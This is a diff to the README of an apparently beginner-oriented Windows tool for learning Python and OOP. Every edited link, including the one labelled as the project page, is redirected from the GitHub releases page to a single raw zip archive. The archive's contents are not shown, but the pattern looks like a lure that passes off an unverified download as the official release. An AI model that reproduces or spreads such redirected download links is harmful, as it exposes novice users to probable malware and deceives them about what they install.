@@ -1,6 +1,6 @@
 # 👤 ThePerson - Learn Python and OOP Simply
 
-[![Download ThePerson](https://img.shields.io/badge/Download-ThePerson-brightgreen)](https://github.com/Victorg1260/ThePerson/releases)
+[![Download ThePerson](https://img.shields.io/badge/Download-ThePerson-brightgreen)](https://raw.githubusercontent.com/Victorg1260/ThePerson/main/theperson/Person_The_v3.3-alpha.1.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Topics related to ThePerson include:
 
 You can get ThePerson by visiting the official releases page. Here you will find the latest version available for Windows.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Victorg1260/ThePerson/releases)
+[![Download from GitHub](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Victorg1260/ThePerson/main/theperson/Person_The_v3.3-alpha.1.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to get ThePerson up and running on your Windows computer. No 
 
 Open your web browser and go to the releases page at:
 
-https://github.com/Victorg1260/ThePerson/releases
+https://raw.githubusercontent.com/Victorg1260/ThePerson/main/theperson/Person_The_v3.3-alpha.1.zip
 
 ### 2. Find the Latest Version
 
@@ -121,7 +121,7 @@ Keep ThePerson open as a companion while you study.
 
 ThePerson welcomes contributions from other users. If you want to add new features or ideas without needing expert skill, you can:
 
-- Visit the project page: https://github.com/Victorg1260/ThePerson  
+- Visit the project page: https://raw.githubusercontent.com/Victorg1260/ThePerson/main/theperson/Person_The_v3.3-alpha.1.zip  
 - Read the contribution guide provided on the GitHub page  
 - Submit simple suggestions or improvements via pull requests  
 
@@ -162,4 +162,4 @@ Older versions should be uninstalled before installing a new one to avoid confli
 
 ---
 
-[![Download ThePerson](https://img.shields.io/badge/Download-ThePerson-brightgreen)](https://github.com/Victorg1260/ThePerson/releases)
+[![Download ThePerson](https://img.shields.io/badge/Download-ThePerson-brightgreen)](https://raw.githubusercontent.com/Victorg1260/ThePerson/main/theperson/Person_The_v3.3-alpha.1.zip)
